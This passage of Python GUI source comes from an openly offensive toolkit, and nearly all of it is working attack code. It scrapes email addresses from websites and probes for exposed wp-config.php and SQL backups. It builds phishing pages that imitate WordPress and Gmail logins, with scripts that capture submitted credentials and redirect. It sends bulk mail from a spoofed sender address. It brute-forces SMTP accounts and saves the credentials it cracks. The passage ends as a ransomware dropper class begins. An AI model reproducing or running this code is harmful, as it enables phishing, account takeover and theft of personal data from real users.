        options_frame.pack(fill=tk.X, padx=10, pady=10)
        self.harvest_from_html = tk.BooleanVar(value=True)
        self.harvest_from_js = tk.BooleanVar(value=True)
        self.harvest_from_db = tk.BooleanVar(value=True)
        self.harvest_deep_scan = tk.BooleanVar(value=False)
        tk.Checkbutton(options_frame, text='Extract from HTML', variable=self.harvest_from_html, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Extract from JavaScript', variable=self.harvest_from_js, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Extract from Database', variable=self.harvest_from_db, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Deep Scan (Crawl Links)', variable=self.harvest_deep_scan, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Start Harvesting', command=self.start_harvesting, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Stop', command=self.stop_harvesting, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Save Results', command=self.save_harvested_emails, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        results_frame = tk.Frame(parent, bg=self.colors['bg'])
        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(results_frame, text='Harvested Emails:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.harvest_results = scrolledtext.ScrolledText(results_frame, height=15, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.harvest_results.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        self.harvest_stats_label = tk.Label(results_frame, text='Total: 0 | Processed: 0 | Emails: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W)
        self.harvest_stats_label.pack(fill=tk.X, pady=(5, 0))

    def setup_phishing_tab(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='Phishing Template:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        template_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        template_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.phishing_template = tk.StringVar(value='WordPress Login')
        templates = ['WordPress Login', 'Gmail Login', 'Facebook Login', 'PayPal Login', 'Bank Login', 'Custom']
        tk.OptionMenu(template_frame, self.phishing_template, *templates).pack(side=tk.LEFT)
        tk.Label(input_frame, text='Target URL (where to host):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.phishing_url_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.phishing_url_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Redirect URL (after capture):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.phishing_redirect_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.phishing_redirect_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        editor_frame = tk.Frame(parent, bg=self.colors['bg'])
        editor_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(editor_frame, text='HTML Editor:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.phishing_editor = scrolledtext.ScrolledText(editor_frame, height=15, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.phishing_editor.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Load Template', command=self.load_phishing_template, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Generate & Save', command=self.generate_phishing_page, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)

    def setup_sender_tab(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='SMTP Server:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        smtp_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        smtp_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.smtp_server_entry = tk.Entry(smtp_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_server_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Label(smtp_frame, text='Port:', font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(5, 0))
        self.smtp_port_entry = tk.Entry(smtp_frame, width=8, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_port_entry.insert(0, '587')
        self.smtp_port_entry.pack(side=tk.LEFT, padx=(5, 0))
        tk.Label(input_frame, text='SMTP Username:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.smtp_user_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_user_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='SMTP Password:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.smtp_pass_entry = tk.Entry(input_frame, show='*', font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_pass_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='From Email (Spoof):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.from_email_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.from_email_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='To Emails (File or Comma-separated):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        to_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        to_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.to_emails_entry = tk.Entry(to_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.to_emails_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(to_frame, text='Browse', command=self.browse_email_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        tk.Label(input_frame, text='Subject:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.email_subject_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.email_subject_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Message Body:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.email_body_text = scrolledtext.ScrolledText(input_frame, height=8, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.email_body_text.pack(fill=tk.X, padx=10, pady=(0, 8))
        options_frame = tk.Frame(parent, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        self.use_tls = tk.BooleanVar(value=True)
        self.randomize_subject = tk.BooleanVar(value=False)
        tk.Checkbutton(options_frame, text='Use TLS/SSL', variable=self.use_tls, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Randomize Subject', variable=self.randomize_subject, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Send Emails', command=self.start_sending, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Stop', command=self.stop_sending, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        log_frame = tk.Frame(parent, bg=self.colors['bg'])
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(log_frame, text='Send Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.send_log_text = scrolledtext.ScrolledText(log_frame, height=10, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.send_log_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))

    def setup_smtp_tab(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='SMTP Server:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.smtp_bf_server_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_bf_server_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Port:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.smtp_bf_port_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_bf_port_entry.insert(0, '587')
        self.smtp_bf_port_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Email/Username List (File):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        email_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        email_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.smtp_bf_email_entry = tk.Entry(email_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_bf_email_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(email_frame, text='Browse', command=self.browse_smtp_email_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        tk.Label(input_frame, text='Password List (File):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        pass_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        pass_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.smtp_bf_pass_entry = tk.Entry(pass_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_bf_pass_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(pass_frame, text='Browse', command=self.browse_smtp_pass_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        options_frame = tk.Frame(parent, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        self.smtp_use_tls = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Use TLS/SSL', variable=self.smtp_use_tls, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Start Brute Force', command=self.start_smtp_bruteforce, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Stop', command=self.stop_smtp_bruteforce, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        log_frame = tk.Frame(parent, bg=self.colors['bg'])
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(log_frame, text='Brute Force Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.smtp_bf_log_text = scrolledtext.ScrolledText(log_frame, height=15, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.smtp_bf_log_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        self.smtp_bf_stats_label = tk.Label(log_frame, text='Total: 0 | Processed: 0 | Breached: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W)
        self.smtp_bf_stats_label.pack(fill=tk.X, pady=(5, 0))

    def browse_harvest_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.harvest_url_entry.delete(0, tk.END)
            self.harvest_url_entry.insert(0, filename)

    def browse_email_file(self):
        filename = filedialog.askopenfilename(title='Select Email List', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.to_emails_entry.delete(0, tk.END)
            self.to_emails_entry.insert(0, filename)

    def browse_smtp_email_file(self):
        filename = filedialog.askopenfilename(title='Select Email/Username List', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.smtp_bf_email_entry.delete(0, tk.END)
            self.smtp_bf_email_entry.insert(0, filename)

    def browse_smtp_pass_file(self):
        filename = filedialog.askopenfilename(title='Select Password List', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.smtp_bf_pass_entry.delete(0, tk.END)
            self.smtp_bf_pass_entry.insert(0, filename)

    def start_harvesting(self):
        if self.is_running:
            messagebox.showwarning('Warning', 'Harvesting already in progress!')
            return
        url_input = self.harvest_url_entry.get().strip()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter a URL or select a file!')
            return
        self.stop_flag = False
        self.is_running = True
        self.harvested_emails = []
        self.stats = {'total': 0, 'processed': 0, 'emails_harvested': 0, 'emails_sent': 0, 'smtp_breached': 0}
        threading.Thread(target=self.harvest_worker, args=(url_input,), daemon=True).start()

    def stop_harvesting(self):
        self.stop_flag = True
        self.is_running = False

    def harvest_worker(self, url_input):
        import re
        from urllib.parse import urljoin, urlparse
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    urls = [line.strip() for line in f if line.strip() and (line.strip().startswith('http://') or line.strip().startswith('https://'))]
            except:
                self.log(f'[ERROR] Failed to read file: {url_input}', 'fg_red')
                self.is_running = False
                return
        else:
            urls = [url_input]
        self.stats['total'] = len(urls)
        self.stats_queue.put(self.stats.copy())
        email_pattern = re.compile('\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b')
        for url in urls:
            if self.stop_flag:
                break
            try:
                self.log(f'[HARVEST] Processing: {url}', 'fg_cyan')
                response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
                if self.harvest_from_html:
                    emails = email_pattern.findall(response.text)
                    for email in emails:
                        if email.lower() not in [e.lower() for e in self.harvested_emails]:
                            self.harvested_emails.append(email)
                            self.harvest_results.insert(tk.END, f'{email}\n', 'fg_green')
                            self.harvest_results.see(tk.END)
                            self.log(f'[EMAIL] Found: {email}', 'fg_green')
                if self.harvest_from_js:
                    js_pattern = re.compile('<script[^>]*>.*?</script>', re.DOTALL | re.IGNORECASE)
                    js_blocks = js_pattern.findall(response.text)
                    for js in js_blocks:
                        emails = email_pattern.findall(js)
                        for email in emails:
                            if email.lower() not in [e.lower() for e in self.harvested_emails]:
                                self.harvested_emails.append(email)
                                self.harvest_results.insert(tk.END, f'{email}\n', 'fg_green')
                                self.harvest_results.see(tk.END)
                                self.log(f'[EMAIL] Found in JS: {email}', 'fg_green')
                if self.harvest_deep_scan:
                    link_pattern = re.compile('href=["\\\']([^"\\\']+)["\\\']', re.IGNORECASE)
                    links = link_pattern.findall(response.text)
                    for link in links[:10]:
                        if self.stop_flag:
                            break
                        try:
                            full_url = urljoin(url, link)
                            if urlparse(full_url).netloc == urlparse(url).netloc:
                                deep_response = requests.get(full_url, timeout=5, verify=False, allow_redirects=True)
                                emails = email_pattern.findall(deep_response.text)
                                for email in emails:
                                    if email.lower() not in [e.lower() for e in self.harvested_emails]:
                                        self.harvested_emails.append(email)
                                        self.harvest_results.insert(tk.END, f'{email}\n', 'fg_green')
                                        self.harvest_results.see(tk.END)
                                        self.log(f'[EMAIL] Found (deep): {email}', 'fg_green')
                        except:
                            pass
                if self.harvest_from_db:
                    try:
                        db_urls = [f'{url}/wp-config.php', f'{url}/wp-config.php.bak', f'{url}/wp-config.php.old', f'{url}/database.sql', f'{url}/backup.sql']
                        for db_url in db_urls:
                            if self.stop_flag:
                                break
                            try:
                                db_response = requests.get(db_url, timeout=5, verify=False, allow_redirects=True)
                                if db_response.status_code == 200:
                                    emails = email_pattern.findall(db_response.text)
                                    for email in emails:
                                        if email.lower() not in [e.lower() for e in self.harvested_emails]:
                                            self.harvested_emails.append(email)
                                            self.harvest_results.insert(tk.END, f'{email}\n', 'fg_green')
                                            self.harvest_results.see(tk.END)
                                            self.log(f'[EMAIL] Found in DB: {email}', 'fg_green')
                            except:
                                pass
                    except:
                        pass
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats['emails_harvested'] = len(self.harvested_emails)
                    self.stats_queue.put(self.stats.copy())
            except Exception as e:
                self.log(f'[ERROR] {url}: {str(e)}', 'fg_red')
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats_queue.put(self.stats.copy())
        self.is_running = False
        self.log(f'[DONE] Harvesting completed. Found {len(self.harvested_emails)} unique emails.', 'fg_green')

    def save_harvested_emails(self):
        if not self.harvested_emails:
            messagebox.showwarning('Warning', 'No emails to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'harvested_emails_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                for email in self.harvested_emails:
                    f.write(f'{email}\n')
            messagebox.showinfo('Success', f'Saved {len(self.harvested_emails)} emails to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

    def load_phishing_template(self):
        template = self.phishing_template.get()
        templates = {'WordPress Login': '<!DOCTYPE html>\n<html>\n<head>\n    <title>WordPress Login</title>\n    <style>\n        body { font-family: Arial; background: #f1f1f1; }\n        .login { width: 320px; margin: 100px auto; background: white; padding: 20px; border-radius: 5px; }\n        input { width: 100%; padding: 10px; margin: 10px 0; }\n        button { width: 100%; padding: 10px; background: #0073aa; color: white; border: none; }\n    </style>\n</head>\n<body>\n    <div class="login">\n        <h2>WordPress Login</h2>\n        <form method="POST" action="">\n            <input type="text" name="username" placeholder="Username" required>\n            <input type="password" name="password" placeholder="Password" required>\n            <button type="submit">Log In</button>\n        </form>\n    </div>\n    <script>\n        document.querySelector(\'form\').addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            var data = new FormData(this);\n            fetch(\'\', { method: \'POST\', body: data });\n            window.location.href = \'REDIRECT_URL\';\n        });\n    </script>\n</body>\n</html>', 'Gmail Login': '<!DOCTYPE html>\n<html>\n<head>\n    <title>Gmail</title>\n    <style>\n        body { font-family: Arial; background: white; }\n        .login { width: 400px; margin: 100px auto; }\n        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; }\n        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; }\n    </style>\n</head>\n<body>\n    <div class="login">\n        <h1>Gmail</h1>\n        <form method="POST" action="">\n            <input type="email" name="email" placeholder="Email" required>\n            <input type="password" name="password" placeholder="Password" required>\n            <button type="submit">Sign In</button>\n        </form>\n    </div>\n    <script>\n        document.querySelector(\'form\').addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            var data = new FormData(this);\n            fetch(\'\', { method: \'POST\', body: data });\n            window.location.href = \'REDIRECT_URL\';\n        });\n    </script>\n</body>\n</html>'}
        if template in templates:
            self.phishing_editor.delete(1.0, tk.END)
            self.phishing_editor.insert(1.0, templates[template])
        else:
            self.phishing_editor.delete(1.0, tk.END)

    def generate_phishing_page(self):
        html = self.phishing_editor.get(1.0, tk.END)
        redirect_url = self.phishing_redirect_entry.get().strip() or 'https://www.google.com'
        html = html.replace('REDIRECT_URL', redirect_url)
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'phishing_{timestamp}.html'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html)
            messagebox.showinfo('Success', f'Phishing page saved to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

    def start_sending(self):
        if self.is_running:
            messagebox.showwarning('Warning', 'Sending already in progress!')
            return
        smtp_server = self.smtp_server_entry.get().strip()
        smtp_port = self.smtp_port_entry.get().strip()
        smtp_user = self.smtp_user_entry.get().strip()
        smtp_pass = self.smtp_pass_entry.get().strip()
        from_email = self.from_email_entry.get().strip()
        to_emails_input = self.to_emails_entry.get().strip()
        subject = self.email_subject_entry.get().strip()
        body = self.email_body_text.get(1.0, tk.END).strip()
        if not all([smtp_server, smtp_port, smtp_user, smtp_pass, from_email, to_emails_input, subject, body]):
            messagebox.showwarning('Warning', 'Please fill all fields!')
            return
        to_emails = []
        if os.path.isfile(to_emails_input):
            try:
                with open(to_emails_input, 'r', encoding='utf-8') as f:
                    to_emails = [line.strip() for line in f if line.strip() and '@' in line.strip()]
            except:
                messagebox.showerror('Error', 'Failed to read email file!')
                return
        else:
            to_emails = [e.strip() for e in to_emails_input.split(',') if e.strip() and '@' in e.strip()]
        if not to_emails:
            messagebox.showwarning('Warning', 'No valid emails found!')
            return
        self.stop_flag = False
        self.is_running = True
        self.stats = {'total': len(to_emails), 'processed': 0, 'emails_harvested': 0, 'emails_sent': 0, 'smtp_breached': 0}
        threading.Thread(target=self.send_worker, args=(smtp_server, smtp_port, smtp_user, smtp_pass, from_email, to_emails, subject, body), daemon=True).start()

    def stop_sending(self):
        self.stop_flag = True
        self.is_running = False

    def send_worker(self, smtp_server, smtp_port, smtp_user, smtp_pass, from_email, to_emails, subject, body):
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        import random
        try:
            port = int(smtp_port)
        except:
            port = 587
        for to_email in to_emails:
            if self.stop_flag:
                break
            try:
                if self.use_tls.get():
                    server = smtplib.SMTP(smtp_server, port)
                    server.starttls()
                else:
                    server = smtplib.SMTP_SSL(smtp_server, port)
                server.login(smtp_user, smtp_pass)
                msg = MIMEMultipart()
                msg['From'] = from_email
                msg['To'] = to_email
                if self.randomize_subject.get():
                    msg['Subject'] = f'{subject} {random.randint(1000, 9999)}'
                else:
                    msg['Subject'] = subject
                msg.attach(MIMEText(body, 'plain'))
                server.send_message(msg)
                server.quit()
                self.send_log_text.insert(tk.END, f'[SENT] {to_email}\n', 'fg_green')
                self.send_log_text.see(tk.END)
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats['emails_sent'] += 1
                    self.stats_queue.put(self.stats.copy())
                time.sleep(1)
            except Exception as e:
                self.send_log_text.insert(tk.END, f'[FAILED] {to_email}: {str(e)}\n', 'fg_red')
                self.send_log_text.see(tk.END)
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats_queue.put(self.stats.copy())
        self.is_running = False
        self.log(f"[DONE] Sending completed. Sent {self.stats['emails_sent']} emails.", 'fg_green')

    def start_smtp_bruteforce(self):
        if self.is_running:
            messagebox.showwarning('Warning', 'Brute force already in progress!')
            return
        smtp_server = self.smtp_bf_server_entry.get().strip()
        smtp_port = self.smtp_bf_port_entry.get().strip()
        email_file = self.smtp_bf_email_entry.get().strip()
        pass_file = self.smtp_bf_pass_entry.get().strip()
        if not all([smtp_server, smtp_port, email_file, pass_file]):
            messagebox.showwarning('Warning', 'Please fill all fields!')
            return
        if not os.path.isfile(email_file) or not os.path.isfile(pass_file):
            messagebox.showwarning('Warning', 'Email and password files must exist!')
            return
        self.stop_flag = False
        self.is_running = True
        self.stats = {'total': 0, 'processed': 0, 'emails_harvested': 0, 'emails_sent': 0, 'smtp_breached': 0}
        threading.Thread(target=self.smtp_bruteforce_worker, args=(smtp_server, smtp_port, email_file, pass_file), daemon=True).start()

    def stop_smtp_bruteforce(self):
        self.stop_flag = True
        self.is_running = False

    def smtp_bruteforce_worker(self, smtp_server, smtp_port, email_file, pass_file):
        import smtplib
        try:
            emails = []
            with open(email_file, 'r', encoding='utf-8') as f:
                emails = [line.strip() for line in f if line.strip()]
            passwords = []
            with open(pass_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.stats['total'] = len(emails) * len(passwords)
            self.stats_queue.put(self.stats.copy())
            try:
                port = int(smtp_port)
            except:
                port = 587
            breached = []
            for email in emails:
                if self.stop_flag:
                    break
                for password in passwords:
                    if self.stop_flag:
                        break
                    try:
                        if self.smtp_use_tls.get():
                            server = smtplib.SMTP(smtp_server, port, timeout=5)
                            server.starttls()
                        else:
                            server = smtplib.SMTP_SSL(smtp_server, port, timeout=5)
                        server.login(email, password)
                        server.quit()
                        breached.append(f'{email}:{password}')
                        self.smtp_bf_log_text.insert(tk.END, f'[BREACHED] {email}:{password}\n', 'fg_green')
                        self.smtp_bf_log_text.see(tk.END)
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats['smtp_breached'] += 1
                            self.stats_queue.put(self.stats.copy())
                    except smtplib.SMTPAuthenticationError:
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats_queue.put(self.stats.copy())
                    except Exception as e:
                        self.smtp_bf_log_text.insert(tk.END, f'[ERROR] {email}:{password} - {str(e)}\n', 'fg_red')
                        self.smtp_bf_log_text.see(tk.END)
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats_queue.put(self.stats.copy())
            if breached:
                timestamp = time.strftime('%Y%m%d_%H%M%S')
                filename = f'smtp_breached_{timestamp}.txt'
                try:
                    with open(filename, 'w', encoding='utf-8') as f:
                        for cred in breached:
                            f.write(f'{cred}\n')
                    self.log(f'[SAVED] Breached credentials saved to: {filename}', 'fg_green')
                except:
                    pass
            self.is_running = False
            self.log(f'[DONE] SMTP brute force completed. Breached {len(breached)} accounts.', 'fg_green')
        except Exception as e:
            self.log(f'[ERROR] {str(e)}', 'fg_red')
            self.is_running = False

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                if hasattr(self, 'harvest_results'):
                    self.harvest_results.insert(tk.END, log_msg, color)
                    self.harvest_results.see(tk.END)
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                if hasattr(self, 'harvest_stats_label'):
                    self.harvest_stats_label.config(text=f"Total: {stats['total']} | Processed: {stats['processed']} | Emails: {stats['emails_harvested']}")
                if hasattr(self, 'smtp_bf_stats_label'):
                    self.smtp_bf_stats_label.config(text=f"Total: {stats['total']} | Processed: {stats['processed']} | Breached: {stats['smtp_breached']}")
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

class RansomwareDropperTab(BaseTab):

    def __init__(self, root, colors, control_panel=None):
        super().__init__(root, colors, control_panel)
        self.setup_tab()
        self.stop_flag = False
        self.is_running = False
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
